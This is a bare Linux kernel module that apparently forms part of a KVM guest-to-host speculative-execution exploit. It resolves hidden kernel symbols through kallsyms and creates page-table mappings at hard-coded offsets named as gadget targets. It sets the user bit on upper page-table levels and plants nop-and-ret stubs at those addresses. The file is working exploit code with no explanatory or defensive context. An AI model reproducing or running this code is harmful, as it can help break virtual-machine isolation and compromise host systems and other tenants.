#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kvm_host.h>
#include <asm/kvm_host.h>
#include <linux/kallsyms.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/ioctl.h>
#include <linux/miscdevice.h>
#include <linux/blkdev.h>
#include <linux/gfp.h>
#include <linux/vmalloc.h>
#include <linux/irqflags.h>
#include <linux/moduleparam.h>

void target_code(void);
void target_code__end(void);
asm (
  "target_code:\n\t"
  ".rept 10\n\t"
  "nop\n\t"
  ".endr\n\t"
  "ret\n\t"
  "target_code__end:\n\t"
);

static unsigned long kernel_load_address = 0xffffffff81000000;

module_param(kernel_load_address, ulong, 0);

#define N_OF_TARGETS 3

#define R8_LOAD_ADDRESS (kernel_load_address + 0x2c9d3)
#define PHYS_LOAD_ADDRESS (kernel_load_address + 0xa9def)
#define RSI_CONTROLLED_CALL_ADDRESS (kernel_load_address + 0x514edd)

static pte_t *target_ptes[N_OF_TARGETS];
static u8 *target_code_pages[N_OF_TARGETS];
static void (*flush_tlb_all)(void);
static int __init my_init(void) {
	int (*__pte_alloc_kernel)(pmd_t *pmd, unsigned long address) = (void*)kallsyms_lookup_name("__pte_alloc_kernel");
	struct mm_struct *init_mm_ptr = (void*)kallsyms_lookup_name("init_mm");
	int i;

	unsigned long target_addrs[N_OF_TARGETS] = {
		R8_LOAD_ADDRESS,
		PHYS_LOAD_ADDRESS,
		RSI_CONTROLLED_CALL_ADDRESS,
	};

	flush_tlb_all = (void*)kallsyms_lookup_name("flush_tlb_all");

	for (i=0; i<N_OF_TARGETS; i++) {
		unsigned long target_page = target_addrs[i] & ~0xfffUL;
		pgd_t *pgd = pgd_offset(init_mm_ptr, target_page);
		p4d_t *p4d = p4d_alloc(init_mm_ptr, pgd, target_page);
		pud_t *pud = pud_alloc(init_mm_ptr, p4d, target_page);
		pmd_t *pmd = pmd_alloc(init_mm_ptr, pud, target_page);
		pr_warn("pgd = 0x%lx\n", pgd->pgd);
		pr_warn("pud = 0x%lx\n", pud->pud);
		pr_warn("pmd = 0x%lx\n", pmd->pmd);
		pr_warn("target_addrs[%d] = 0x%lx\n", i, target_addrs[i]);
		target_code_pages[i] = (void*)__get_free_page(GFP_KERNEL);
		target_ptes[i] = pte_alloc_kernel(pmd, target_page);
		pgd->pgd |= 0x4;
		pud->pud |= 0x4;
		pmd->pmd |= 0x4;
		if (target_ptes[i]->pte != 0) {
			pr_warn("PTE %d IS NOT ZERO (0x%lx), ABORTING - maybe reboot to get new random guest addresses?\n", i, target_ptes[i]->pte);
			return -EINVAL;
		}
		pr_warn("pte %d is zero\n", i);
		target_ptes[i]->pte = 0x3 | virt_to_phys(target_code_pages[i]);
		flush_tlb_all();
		pr_warn("set pte %d\n", i);
		memcpy((void*)target_addrs[i], target_code, (unsigned long)target_code__end - (unsigned long)target_code);
		target_ptes[i]->pte = 0x7 | virt_to_phys(target_code_pages[i]);
		flush_tlb_all();
	}
	
	return 0;
}

static void __exit my_exit(void) {
	int i;

	for (i=0; i<N_OF_TARGETS; i++) {
		target_ptes[i]->pte = 0;
		flush_tlb_all();
		free_page((unsigned long)target_code_pages[i]);
	}
}

module_init(my_init);
module_exit(my_exit);
MODULE_LICENSE("GPL");
